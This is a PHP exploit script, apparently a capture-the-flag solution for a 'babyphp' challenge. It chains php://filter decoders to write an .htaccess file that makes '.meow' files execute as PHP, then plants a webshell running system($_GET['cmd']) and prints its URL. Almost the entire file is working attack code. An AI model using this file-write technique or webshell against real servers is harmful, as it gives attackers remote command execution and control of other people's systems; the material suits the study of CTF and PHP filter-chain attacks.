<?php

// There should be various solution to this challenge.

$BASE_URL = 'https://babyphp.h4ck3r.quest';

if (date('i')[1] === '8') die("Don't run this exploit at 10*n+8 minutes lol");

function b64e($s)
{
    return trim(base64_encode($s), "=");
}

function gen_exploit($content)
{
    $payload = '0' . b64e($content);
    $payload = 'x' . b64e($payload);
    return $payload;
}

$sesssion_id = bin2hex(random_bytes(16));

$htaccess  = gen_exploit('AddType application/x-httpd-php .meow');

file_get_contents(
    "$BASE_URL/?code=$htaccess&output=php://filter/string.strip_tags|convert.iconv.utf-8.utf-7|convert.base64-decode|string.strip_tags|convert.quoted-printable-decode|convert.base64-decode/resource=.htaccess",
    0,
    stream_context_create(['http' => ['header' => "Cookie: PHPSESSID=$sesssion_id"]])
);

$webshell  = gen_exploit('<pre><?php system($_GET["cmd"]); ?>');

$res = file_get_contents(
    "$BASE_URL/?code=$webshell&output=php://filter/string.strip_tags|convert.iconv.utf-8.utf-7|convert.base64-decode|string.strip_tags|convert.quoted-printable-decode|convert.base64-decode/resource=shell.meow",
    0,
    stream_context_create(['http' => ['header' => "Cookie: PHPSESSID=$sesssion_id"]])
);

// echo $res;
preg_match("/\/sandbox\/[0-9a-f]{32}/", $res, $matches);
echo "Webshell: $BASE_URL" . $matches[0] . "/shell.meow?cmd=ls+/\n";

